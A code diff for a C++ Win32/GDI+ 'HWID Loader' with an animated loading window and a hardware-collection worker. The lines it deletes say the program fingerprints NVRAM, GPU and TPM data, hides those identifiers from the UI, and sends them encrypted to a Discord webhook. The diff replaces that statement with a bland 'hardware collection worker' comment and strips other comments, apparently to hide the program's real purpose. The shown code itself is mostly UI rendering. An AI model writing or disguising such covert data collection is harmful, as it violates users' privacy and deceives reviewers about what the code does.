@@ -1,7 +1,4 @@
-// HWID Loader - composite NVRAM, GPU and TPM fingerprint
-// Borderless Win32 + GDI+ animation. Read-only NVRAM access.
-// The encrypted JSON and decryption parameters are sent to the configured Discord webhook.
-// Hardware identifiers are never rendered in the UI.
+// Win32/GDI+ interface and hardware collection worker.
 
 #define WIN32_LEAN_AND_MEAN
 #define _CRT_SECURE_NO_WARNINGS
@@ -36,11 +33,9 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "winmm.lib")
 
-// ---------------------------------------------------------------- config
 static constexpr float WIN_W = 420.0f;
 static constexpr float WIN_H = 264.0f;
 
-// theme (bw with a single soft accent)
 static const Gdiplus::Color COL_BG      (255, 23, 24, 27);
 static const Gdiplus::Color COL_TEXT    (255, 240, 240, 243);
 static const Gdiplus::Color COL_TRACK   (255, 45, 48, 53);
@@ -54,13 +49,11 @@ static constexpr float T_DONE_HOLD   = 2600.0f;
 static constexpr float T_EXIT        = 620.0f;
 static constexpr float MIN_WORK_MS   = 1800.0f;
 
-// ---------------------------------------------------------------- easing
 static float EaseOutCubic(float t)  { t = t < 0 ? 0 : t > 1 ? 1 : t; float u = 1 - t; return 1 - u * u * u; }
 static float EaseInOutCubic(float t){ t = t < 0 ? 0 : t > 1 ? 1 : t; return t < .5f ? 4*t*t*t : 1 - powf(-2*t + 2, 3) / 2; }
-static float EaseOutQuint(float t)  { t = t < 0 ? 0 : t > 1 ? 1 : t; float u = 1 - t; return 1 - u * u * u * u * u; }   // long glide, no overshoot
+static float EaseOutQuint(float t)  { t = t < 0 ? 0 : t > 1 ? 1 : t; float u = 1 - t; return 1 - u * u * u * u * u; }
 static float Clamp01(float v)       { return v < 0 ? 0 : v > 1 ? 1 : v; }
 
-// ---------------------------------------------------------------- hwid worker
 typedef LONG (NTAPI *PFN_NtEnum)(int, void*, unsigned long*);
 
 struct HwidResult {
@@ -154,7 +147,6 @@ static void HwidWorker() {
     g_hwid.done = true;
 }
 
-// ---------------------------------------------------------------- app state
 enum Phase { PH_APPEAR, PH_LOADING, PH_TOFULL, PH_LOADOUT, PH_DONE, PH_EXIT, PH_QUIT };
 static Phase g_phase = PH_APPEAR;
 static std::chrono::steady_clock::time_point g_phaseStart;
@@ -168,7 +160,7 @@ static Gdiplus::Graphics* g_gfx = nullptr;
 static float WinW = WIN_W, WinH = WIN_H;
 static float S = 1.0f;
 
-// one shared clock: everything derives from it, nothing resets -> no replayed animations
+// Shared animation clock.
 static float NowMs()  { return std::chrono::duration<float, std::milli>(std::chrono::steady_clock::now() - g_t0).count(); }
 static float PhaseMs(){ return std::chrono::duration<float, std::milli>(std::chrono::steady_clock::now() - g_phaseStart).count(); }
 static void  SetPhase(Phase p) { g_phase = p; g_phaseStart = std::chrono::steady_clock::now(); }
@@ -190,7 +182,6 @@ static BYTE g_exitAlpha = 255;
 static float g_exitLift = 0;
 static float g_scale = .1f, g_exitScale = 1;
 
-// ---------------------------------------------------------------- drawing
 static void FillRounded(Gdiplus::Graphics& g, float x, float y, float w, float h, float r, const Gdiplus::Color& c) {
     (void)r; // Square edges throughout the card and controls.
     if (w <= 0 || h <= 0) return;
@@ -264,7 +255,6 @@ static void Render() {
     loadingAlpha *= g_reduceMotion ? 1 : EaseOutCubic(Clamp01((now - 80) / 470));
     float contentY = g_reduceMotion ? 0 : (1 - entrance) * 11 * S;
 
-    // Unobtrusive close control with eased hover feedback.
     FillRounded(g, WinW - 47 * S, 13 * S, 32 * S, 32 * S, 10 * S,
         Gdiplus::Color((BYTE)(g_hoverClose * 18), 255, 255, 255));
     Gdiplus::Pen closePen(Gdiplus::Color(255, (BYTE)(106 + g_hoverClose * 100),
@@ -324,8 +314,7 @@ static void Render() {
     }
 }
 
-// A single persistent premultiplied DIB is both the GDI+ canvas and the layered
-// window surface. No per-frame allocation, bitmap copying, or text resampling.
+// Reuse the premultiplied DIB for GDI+ rendering and the layered window.
 static void DestroyBacking() {
     delete g_gfx; g_gfx = nullptr;
     delete g_backing; g_backing = nullptr;
